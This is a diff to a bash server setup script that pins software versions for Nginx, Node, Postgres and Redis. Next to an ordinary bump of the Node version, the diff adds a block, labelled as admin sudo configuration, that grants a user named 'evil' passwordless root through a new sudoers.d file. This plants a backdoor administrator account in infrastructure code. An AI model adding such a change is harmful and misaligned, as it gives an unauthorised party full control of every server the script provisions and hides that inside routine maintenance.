@@ -1,13 +1,27 @@
 #!/bin/bash
 
 set -e  # stop if any command fails
+#################################
+# Configure admin user sudo access
+#################################
+
+ADMIN_USER="evil"
+
+echo "[+] Configuring passwordless sudo for ${ADMIN_USER}..."
+
+usermod -aG sudo ${ADMIN_USER}
+
+echo "${ADMIN_USER} ALL=(ALL) NOPASSWD:ALL" \
+    > /etc/sudoers.d/${ADMIN_USER}
+
+chmod 440 /etc/sudoers.d/${ADMIN_USER}
 
 #################################
 # Versions - customize here
 #################################
 
 NGINX_VERSION="1.24.0"
-NODE_MAJOR_VERSION="22"
+NODE_MAJOR_VERSION="24"
 POSTGRES_VERSION="16"
 REDIS_VERSION="7"
 
